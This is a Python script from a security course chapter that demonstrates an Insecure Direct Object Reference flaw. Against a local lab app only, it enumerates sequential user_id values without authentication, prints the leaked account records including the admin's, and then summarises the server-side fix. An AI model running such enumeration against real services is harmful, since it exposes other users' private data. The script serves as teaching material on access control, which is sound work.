"""
03_idor_access_control_demo.py -- Broken Access Control / IDOR Demo
=================================================================================
(Ch.25: Injection Attacks and Broken Access Control Deep Dive)

LEGAL / ETHICAL SCOPE
----------------------
Only test systems you own or are authorized to test. This script talks ONLY
to http://127.0.0.1:5000, the local target_app.py you run yourself. Do not
point this script (or any script derived from it) at any other host.

PREREQUISITE
-------------
Run `python target_app.py` in a separate terminal first, then run this
script in a second terminal:
    python 03_idor_access_control_demo.py

WHAT THIS DEMONSTRATES
------------------------
The /account?user_id=... endpoint in target_app.py performs no
authentication and no authorization check -- it just looks up whatever
user_id is requested. This is a textbook Insecure Direct Object Reference
(IDOR), a specific form of Broken Access Control (OWASP A01).

We simulate an unauthenticated/low-privilege attacker who simply walks
through sequential user_id values with no credentials at all, and show
that every account's data (including the admin account's email and
is_admin flag) leaks without any access-control check stopping them.
"""

import requests

TARGET = "http://127.0.0.1:5000"  # local lab target ONLY -- do not change


def enumerate_accounts(id_range=range(1, 6)):
    print("[*] Enumerating /account?user_id=N with NO authentication at all...")
    leaked = []
    for uid in id_range:
        resp = requests.get(f"{TARGET}/account", params={"user_id": uid})
        if resp.status_code == 200:
            data = resp.json()
            leaked.append(data)
            flag = " <-- ADMIN ACCOUNT" if data.get("is_admin") else ""
            print(f"    user_id={uid}: {data}{flag}")
        else:
            print(f"    user_id={uid}: no such user ({resp.status_code})")
    print()

    if leaked:
        print(f"[!] VULNERABLE: leaked {len(leaked)} account record(s) with zero")
        print("    authentication and zero ownership/authorization checks. An")
        print("    attacker who is logged in as 'alice' (user_id=1) should never")
        print("    be able to read bob's or admin's account data via this endpoint,")
        print("    yet nothing here even required being logged in as anyone.")
    print()


# ----------------------------------------------------------------------------
# THE FIX: enforce ownership / authorization server-side
#
# See target_app.py's commented-out account_fixed() for the real server-side
# fix. The key properties a correct fix must have:
#   1. Require the caller to be authenticated (session/token), not just
#      "anyone who can send an HTTP request".
#   2. Compare the authenticated identity against the requested resource
#      owner (or require an explicit admin role) before returning data.
#   3. Never rely on the client to "just not guess other IDs" -- that is
#      security by obscurity, not access control.
#
# This script does not call a live fixed endpoint (the lab intentionally
# only exposes the vulnerable version to study), but conceptually, a fixed
# server would respond 401 Unauthorized (no session) or 403 Forbidden
# (session present but wrong user) to every request this script makes,
# since the script never authenticates as anyone.
# ----------------------------------------------------------------------------
def explain_fix():
    print("[*] Fix summary (see target_app.py account_fixed() comment block):")
    print("    - Add real authentication (sessions/tokens).")
    print("    - Check requested user_id == authenticated user_id (or caller is admin).")
    print("    - Return 401/403 instead of the record when that check fails.")
    print()


if __name__ == "__main__":
    enumerate_accounts()
    explain_fix()
